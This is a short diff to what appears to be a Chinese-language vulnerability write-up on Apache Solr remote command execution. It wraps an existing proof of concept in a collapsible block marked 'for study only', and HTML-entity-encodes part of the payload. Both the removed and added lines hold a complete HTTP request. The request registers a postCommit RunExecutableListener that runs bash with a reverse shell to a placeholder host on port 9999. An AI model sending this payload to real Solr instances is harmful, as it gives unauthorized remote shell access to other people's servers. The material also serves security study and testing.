@@ -33,14 +33,17 @@ app="APACHE-Solr"
 
 使用postCommit来命令执行
 
-```
-POST /solr/demo/config HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST /solr/demo/config HTTP/1.1
 Host: 192.168.1.92:8983
 Content-Length: 180
 Content-Type: application/json
 
-{"add-listener":{"event":"postCommit","name":"suiyi","class":"solr.RunExecutableListener","exe":"bash","dir":"/bin/","args":["-c", "bash -i >& /dev/tcp/your-ip/9999 0>&1"]}}
-```
+{"add-listener":{"event":"postCommit","name":"suiyi","class":"solr.RunExecutableListener","exe":"bash","dir":"/bin/","args":["-c", "&#98;ash -i &gt;&amp; &#47;dev/tcp/your-ip/9999 0&gt;&amp;1"]}}</code></pre>
+
+</details>
 
 通过newSearcher命令执行
 
